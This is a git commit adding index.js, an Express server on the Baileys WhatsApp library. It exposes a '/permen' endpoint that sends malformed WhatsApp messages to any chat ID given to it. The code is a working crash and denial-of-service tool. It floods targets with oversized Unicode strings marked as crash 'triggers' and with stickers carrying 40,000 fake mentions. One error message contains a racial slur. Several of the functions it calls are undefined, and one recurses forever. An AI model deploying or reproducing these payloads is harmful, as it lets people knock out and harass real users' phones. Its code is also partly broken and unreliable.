7db29a6c575f4ec4e3c6c05119d629833d3ed949
username1066648304 <jsclambler@gmail.com>
2025-07-25 16:10:56 +0800

    Add files via upload

---
+++ index.js
@@ -0,0 +1,433 @@
+const express = require("express");
+const fs = require("fs");
+const {
+    default: makeWASocket,
+    useMultiFileAuthState,
+    downloadContentFromMessage,
+    emitGroupParticipantsUpdate,
+    emitGroupUpdate,
+    generateWAMessageContent,
+    generateWAMessage,
+    makeInMemoryStore,
+    prepareWAMessageMedia,
+    generateWAMessageFromContent,
+    MediaType,
+    areJidsSameUser,
+    WAMessageStatus,
+    downloadAndSaveMediaMessage,
+    AuthenticationState,
+    GroupMetadata,
+    initInMemoryKeyStore,
+    getContentType,
+    MiscMessageGenerationOptions,
+    useSingleFileAuthState,
+    BufferJSON,
+    WAMessageProto,
+    MessageOptions,
+    WAFlag,
+    WANode,
+    WAMetric,
+    ChatModification,
+    MessageTypeProto,
+    WALocationMessage,
+    ReconnectMode,
+    WAContextInfo,
+    proto,
+    WAGroupMetadata,
+    ProxyAgent,
+    waChatKey,
+    MimetypeMap,
+    MediaPathMap,
+    WAContactMessage,
+    WAContactsArrayMessage,
+    WAGroupInviteMessage,
+    WATextMessage,
+    WAMessageContent,
+    WAMessage,
+    BaileysError,
+    WA_MESSAGE_STATUS_TYPE,
+    MediaConnInfo,
+    URL_REGEX,
+    WAUrlInfo,
+    WA_DEFAULT_EPHEMERAL,
+    WAMediaUpload,
+    jidDecode,
+    mentionedJid,
+    processTime,
+    Browser,
+    MessageType,
+    Presence,
+    WA_MESSAGE_STUB_TYPES,
+    Mimetype,
+    relayWAMessage,
+    Browsers,
+    GroupSettingChange,
+    DisconnectReason,
+    WASocket,
+    getStream,
+    WAProto,
+    isBaileys,
+    AnyMessageContent,
+    fetchLatestBaileysVersion,
+    templateMessage,
+    InteractiveMessage,
+    Header,
+} = require('@whiskeysockets/baileys');
+const crypto = require("crypto");
+const fetch = require('node-fetch');
+const P = require("pino");
+const readline = require("readline");
+const permen = readline.createInterface({
+  input: process.stdin,
+  output: process.stdout,
+});
+
+let sock;
+let isConnected = false;
+
+const app = express();
+const PORT = process.env.PORT || process.env.SERVER_PORT || 3555;
+app.use((req, res, next) => {
+  res.setHeader("Access-Control-Allow-Origin", "*"); // atau sesuaikan domain
+  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
+  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
+  next();
+});
+async function startBot() {
+  const { state, saveCreds } = await useMultiFileAuthState("permenmd");
+  sock = makeWASocket({
+    auth: state,
+    logger: P({ level: "silent" }),
+    printQRInTerminal: false,
+  });
+
+  sock.ev.on("connection.update", async (update) => {
+    const { connection, lastDisconnect } = update;
+
+    if (connection === "close") {
+      const reason = lastDisconnect?.error?.output?.statusCode;
+      if (reason === 515) {
+        isConnected = false;
+        console.log("Restarting The Bot");
+        await startBot();
+      } else {
+        isConnected = false;
+        console.log("Logged out from WhatsApp.");
+      }
+    } else if (connection === "open") {
+      isConnected = true;
+      const response = await fetch("https://httpbin.org/get");
+      const data = await response.json();
+      console.log(`Bug Api Started At http://${data.origin}:${PORT}`);
+      console.log("Connected to WhatsApp successfully!");
+      console.log("---------------------------------");
+    }
+
+    if (
+      connection === "connecting" &&
+      !fs.existsSync("./permenmd/creds.json")
+    ) {
+      isConnected = false;
+      console.log("Enter your Bot Number, Example: 628xxx");
+      permen.question("Number: ", async (number) => {
+        try {
+          const formattedNumber = number.replace(/\D/g, "");
+          const pairingCode = await sock.requestPairingCode(formattedNumber);
+          const formattedCode =
+            pairingCode?.match(/.{1,4}/g)?.join("-") || pairingCode;
+          console.log(`Your Pairing Code:`, formattedCode);
+          permen.close();
+        } catch (error) {
+          console.log("Error requesting pairing code:", error);
+        }
+      });
+    }
+  });
+
+  sock.ev.on("creds.update", saveCreds);
+}
+
+app.get("/permen", async (req, res) => {
+  const { chatId, type } = req.query;
+
+  if (!chatId || !type) {
+    return res.status(400).json({ error: "Stupid Niggers" });
+  }
+
+  try {
+    if (!isConnected) {
+      return res.status(500).json({ error: "WhatsApp bot is not initialized" });
+    }
+    function sleep(ms) {
+      return new Promise((resolve) => setTimeout(resolve, ms));
+    }
+
+    //function bug
+async function iosinVisFC(target, mention) {
+const TravaIphone = ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000); // Trigger1
+   try {
+      let locationMessage = {
+         degreesLatitude: -9.09999262999,
+         degreesLongitude: 199.99963118999,
+         jpegThumbnail: null,
+         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000), // Trigger2
+         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000), // Trigger 3
+         url: `https://st-gacor.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`, //Trigger 4
+      }
+      let msg = generateWAMessageFromContent(target, {
+         viewOnceMessage: {
+            message: {
+               locationMessage
+            }
+         }
+      }, {});
+      let extendMsg = {
+         extendedTextMessage: { 
+            text: "𝔗𝔥𝔦𝔰 ℑ𝔰 𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + TravaIphone, //Trigger 5
+            matchedText: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫",
+            description: "𑇂𑆵𑆴𑆿".repeat(25000),//Trigger 6
+            title: "𝔖𝔭𝔞𝔯𝔱𝔞𝔫" + "𑇂𑆵𑆴𑆿".repeat(15000),//Trigger 7
+            previewType: "NONE",
+            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAIwAjAMBIgACEQEDEQH/xAAcAAACAwEBAQEAAAAAAAAAAAACAwQGBwUBAAj/xABBEAACAQIDBAYGBwQLAAAAAAAAAQIDBAUGEQcSITFBUXOSsdETFiZ0ssEUIiU2VXGTJFNjchUjMjM1Q0VUYmSR/8QAGwEAAwEBAQEBAAAAAAAAAAAAAAECBAMFBgf/xAAxEQACAQMCAwMLBQAAAAAAAAAAAQIDBBEFEhMhMTVBURQVM2FxgYKhscHRFjI0Q5H/2gAMAwEAAhEDEQA/ALumEmJixiZ4p+bZyMQaYpMJMA6Dkw4sSmGmItMemEmJTGJgUmMTDTFJhJgUNTCTFphJgA1MNMSmGmAxyYaYmLCTEUPR6LiwkwKTKcmMjISmEmWYR6YSYqLDTEUMTDixSYSYg6D0wkxKYaYFpj0wkxMWMTApMYmGmKTCTAoamEmKTDTABqYcWJTDTAY1MYnwExYSYiioJhJiUz1z0LMQ9MOMiC6+nSexrrrENM6CkGpEBV11hxrrrAeScpBxkQVXXWHCsn0iHknKQSloRPTJLmD9IXWBaZ0FINSOcrhdYcbhdYDydFMJMhwrJ9I30gFZJKkGmRFVXWNhPUB5JKYSYqLC1AZT9eYmtPdQx9JEupcGUYmy/wCz/LOGY3hFS5v6dSdRVXFbs2kkkhW0jLmG4DhFtc4fCpCpOuqb3puSa3W/kdzY69ctVu3l4Ijbbnplqy97XwTNrhHg5xzPqXbUfNnE2Ldt645nN2cZdw7HcIuLm/hUnUhXdNbs2kkoxfzF7RcCsMBtrOpYRnB1JuMt6bfQdbYk9ctXnvcvggI22y3cPw3tZfCJwjwM45kStqS0zi7Vuwuff1B2f5cw7GsDldXsKk6qrSgtJtLRJeYGfsBsMEs7WrYxnCU5uMt6bfDQ6+x172U5v/sz8IidsD0wux7Z+AOEeDnHM6TtqPm3ibVuwueOZV8l2Vvi2OQtbtSlSdOUmovTijQfUjBemjV/VZQdl0tc101/Bn4Go5lvqmG4FeXlBRdWjTcoqXLULeMXTcpIrSaFCVq6lWKeG+45iyRgv7mr+qz1ZKwZf5NX9RlEjtJxdr+6te6/M7mTc54hjOPUbK5p0I05xk24RafBa9ZUZ0ZPCXyLpXWnVZqEYLL9QWasq0sPs5XmHynuU/7dOT10XWmVS0kqt1Qpy13ZzjF/k2avmz7uX/ZMx/DZft9r2sPFHC4hGM1gw6pb06FxFQWE/wAmreqOE/uqn6jKLilKFpi9zb0dVTpz0jq9TWjJMxS9pL7tPkjpdQjGKwjXrNvSpUounFLn3HtOWqGEek+A5MxHz5Tm+ZDu39VkhviyJdv6rKMOco1vY192a3vEvBEXbm9MsWXvkfgmSdjP3Yre8S8ERNvGvqvY7qb/AGyPL+SZv/o9x9jLsj4Q9hr1yxee+S+CBH24vTDsN7aXwjdhGvqve7yaf0yXNf8ACBH27b39G4Zupv8Arpcv5RP+ORLshexfU62xl65Rn7zPwiJ2xvTCrDtn4B7FdfU+e8mn9Jnz/KIrbL/hWH9s/Ab9B7jpPsn4V9it7K37W0+xn4GwX9pRvrSrbXUN+jVW7KOumqMd2Vfe6n2M/A1DOVzWtMsYjcW1SVOtTpOUZx5pitnik2x6PJRspSkspN/QhLI+X1ysV35eZLwzK+EYZeRurK29HXimlLeb5mMwzbjrXHFLj/0suzzMGK4hmm3t7y+rVqMoTbhJ8HpEUK1NySUTlb6jZ1KsYwpYbfgizbTcXq2djTsaMJJXOu/U04aLo/MzvDH9oWnaw8Ua7ne2pXOWr300FJ04b8H1NdJj2GP7QtO1h4o5XKaqJsy6xGSu4uTynjHqN+MhzG/aW/7T5I14x/Mj9pr/ALT5I7Xn7Uehrvoo+37HlJ8ByI9F8ByZ558wim68SPcrVMaeSW8i2YE+407Yvd0ZYNd2m+vT06zm468d1pcTQqtKnWio1acJpPXSSTPzXbVrmwuY3FlWqUK0eU4PRnXedMzLgsTqdyPka6dwox2tH0tjrlOhQjSqxfLwN9pUqdGLjSpwgm9dIpI+q0aVZJVacJpct6KZgazpmb8Sn3Y+QSznmX8Sn3I+RflUPA2/qK26bX8vyb1Sp06Ud2lCMI89IrRGcbY7qlK3sLSMk6ym6jj1LTQqMM4ZjktJYlU7sfI5tWde7ryr3VWdWrLnOb1bOdW4Uo7UjHf61TuKDpUotZ8Sw7Ko6Ztpv+DPwNluaFK6oTo3EI1KU1pKMlqmjAsPurnDbpXFjVdKsk0pJdDOk825g6MQn3Y+RNGvGEdrRGm6pStaHCqRb5+o1dZZwVf6ba/pofZ4JhtlXVa0sqFKquCnCGjRkSzbmH8Qn3Y+Qcc14/038+7HyOnlNPwNq1qzTyqb/wAX5NNzvdUrfLV4qkknUjuRXW2ZDhkPtC07WHih17fX2J1Izv7ipWa5bz4L8kBTi4SjODalFpp9TM9WrxJZPJv79XdZVEsJG8mP5lXtNf8AafINZnxr/ez7q8iBOpUuLidavJzqzespPpZVevGokka9S1KneQUYJrD7x9IdqR4cBupmPIRTIsITFjIs6HnJh6J8z3cR4mGmIvJ8qa6g1SR4mMi9RFJpnsYJDYpIBBpgWg1FNHygj5MNMBnygg4wXUeIJMQxkYoNICLDTApBKKGR4C0wkwDoOiw0+AmLGJiLTKWmHFiU9GGmdTzsjosNMTFhpiKTHJhJikw0xFDosNMQmMiwOkZDkw4sSmGmItDkwkxUWGmAxiYyLEphJgA9MJMVGQaYihiYaYpMJMAKcnqep6MCIZ0MbWQ0w0xK5hoCUxyYaYmIaYikxyYSYpcxgih0WEmJXMYmI6RY1MOLEoNAWOTCTFRfHQNAMYmMjIUEgAcmFqKiw0xFH//Z",
+            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
+            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
+            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
+            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
+            mediaKeyTimestamp: "1743101489",
+            thumbnailHeight: 641,
+            thumbnailWidth: 640,
+            inviteLinkGroupTypeV2: "DEFAULT"
+         }
+      }
+      let msg2 = generateWAMessageFromContent(target, {
+         viewOnceMessage: {
+            message: {
+               extendMsg
+            }
+         }
+      }, {});
+      let msg3 = generateWAMessageFromContent(target, {
+         viewOnceMessage: {
+            message: {
+               locationMessage
+            }
+         }
+      }, {});
+      await sock.relayMessage('status@broadcast', msg.message, {
+         messageId: msg.key.id,
+         statusJidList: [target],
+         additionalNodes: [{
+            tag: 'meta',
+            attrs: {},
+            content: [{
+               tag: 'mentioned_users',
+               attrs: {},
+               content: [{
+                  tag: 'to',
+                  attrs: {
+                     jid: target
+                  },
+                  content: undefined
+               }]
+            }]
+         }]
+      });
+      await sock.relayMessage('status@broadcast', msg2.message, {
+         messageId: msg2.key.id,
+         statusJidList: [target],
+         additionalNodes: [{
+            tag: 'meta',
+            attrs: {},
+            content: [{
+               tag: 'mentioned_users',
+               attrs: {},
+               content: [{
+                  tag: 'to',
+                  attrs: {
+                     jid: target
+                  },
+                  content: undefined
+               }]
+            }]
+         }]
+      });
+      await sock.relayMessage('status@broadcast', msg3.message, {
+         messageId: msg2.key.id,
+         statusJidList: [target],
+         additionalNodes: [{
+            tag: 'meta',
+            attrs: {},
+            content: [{
+               tag: 'mentioned_users',
+               attrs: {},
+               content: [{
+                  tag: 'to',
+                  attrs: {
+                     jid: target
+                  },
+                  content: undefined
+               }]
+            }]
+         }]
+      });
+   } catch (err) {
+      console.error(err);
+   }
+};
+
+
+async function bulldozer1GB(target) {
+  let parse = true;
+  let SID = "5e03e0&mms3";
+  let key = "10000000_2012297619515179_5714769099548640934_n.enc";
+  let type = `image/webp`;
+  if (11 > 9) {
+    parse = parse ? false : true;
+  }
+
+  let message = {
+    viewOnceMessage: {
+      message: {
+        stickerMessage: {
+          url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}=true`,
+          fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
+          fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
+          mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
+          mimetype: type,
+          directPath:
+            "/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0",
+          fileLength: {
+            low: Math.floor(Math.random() * 1000),
+            high: 0,
+            unsigned: true,
+          },
+          mediaKeyTimestamp: {
+            low: Math.floor(Math.random() * 1700000000),
+            high: 0,
+            unsigned: false,
+          },
+          firstFrameLength: 19904,
+          firstFrameSidecar: "KN4kQ5pyABRAgA==",
+          isAnimated: true,
+          contextInfo: {
+            participant: target,
+            mentionedJid: [
+              "0@s.whatsapp.net",
+              ...Array.from(
+                {
+                  length: 1000 * 40,
+                },
+                () =>
+                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
+              ),
+            ],
+            groupMentions: [],
+            entryPointConversionSource: "non_contact",
+            entryPointConversionApp: "whatsapp",
+            entryPointConversionDelaySeconds: 467593,
+          },
+          stickerSentTs: {
+            low: Math.floor(Math.random() * -20000000),
+            high: 555,
+            unsigned: parse,
+          },
+          isAvatar: parse,
+          isAiSticker: parse,
+          isLottie: parse,
+        },
+      },
+    },
+  };
+
+  const msg = generateWAMessageFromContent(target, message, {});
+
+  await sock.relayMessage("status@broadcast", msg.message, {
+    messageId: msg.key.id,
+    statusJidList: [target],
+    additionalNodes: [
+      {
+        tag: "meta",
+        attrs: {},
+        content: [
+          {
+            tag: "mentioned_users",
+            attrs: {},
+            content: [
+              {
+                tag: "to",
+                attrs: { jid: target },
+                content: undefined,
+              },
+            ],
+          },
+        ],
+      },
+    ],
+  });
+}
+
+    async function crashtotal(target) {
+      for (let i = 0; i <= 1; i++) {
+        await iosinVisFC(target, true);
+      }
+    }
+    
+    async function blank(target) {
+      for (let i = 0; i <= 1; i++) {
+        await blank(target);
+        await BlankScreen1(target);
+      }
+    }
+    
+    async function delay(target) {
+      for (let i = 0; i <= 25; i++) {
+        await bulldozer1GB(target);
+      }
+    }
+    
+    async function palingan(target) {
+      for (let i = 0; i <= 1; i++) {
+        await Fcj(target);
+        await XeonXRobust(target);
+      }
+    }
+    
+    if (type === "blank") {
+      blankk(chatId);    
+    } else if (type === "crashtotal") {
+      crashtotal(chatId);
+    } else if (type === "fc") {
+      palingan(chatId);
+    } else if (type === "delay") {
+      delay(chatId);
+    }
+    console.log("Successfully Send Nandemo Bug.");
+    res.json({
+      success: true,
+      message: "Nandemo Bug sent successfully!",
+      target: chatId,
+    });
+  } catch (error) {
+    console.error("Error sending message:", error);
+    res
+      .status(500)
+      .json({ error: "Failed to send message", details: error.toString() });
+  }
+});
+app.get("/status", (req, res) => {
+  res.json({ connected: isConnected });
+});
+app.get("/refresh", async (req, res) => {
+  try {
+    if (!isConnected) {
+      await startBot();
+      res.json({ connected: isConnected });
+    } else {
+      res.json({ connected: isConnected });
+    }
+  } catch (error) {
+    console.log(error);
+  }
+});
+app.listen(PORT);
+startBot();
